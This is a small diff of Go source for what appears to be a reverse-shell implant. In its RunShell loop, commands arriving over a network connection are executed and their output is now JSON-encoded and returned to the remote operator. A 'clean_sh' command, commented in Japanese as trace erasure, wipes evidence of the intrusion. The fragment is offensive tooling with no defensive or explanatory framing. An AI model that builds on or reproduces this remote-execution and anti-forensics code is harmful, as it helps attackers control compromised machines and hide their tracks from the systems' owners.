@@ -91,6 +91,7 @@ func RunShell(conn net.Conn) error {
 		case "clean_sh": //痕跡消去 ex: clean_go_reversh
 			//execCleanSh
 			fmt.Println("CLEAN")
+
 			err := ExecClean()
 			if err != nil {
 				log.Println(err)
@@ -102,9 +103,12 @@ func RunShell(conn net.Conn) error {
 
 		default:
 			//execCommand
-			err := ExecCommand(string(cmdBuff[:n]), conn)
+			output, err := ExecCommand(string(cmdBuff[:n]), conn)
 			if err != nil {
 				log.Println(err)
+			}
+			if output != nil {
+				JsonEncodeToConnection(conn, *output)
 			}
 		}
 	}
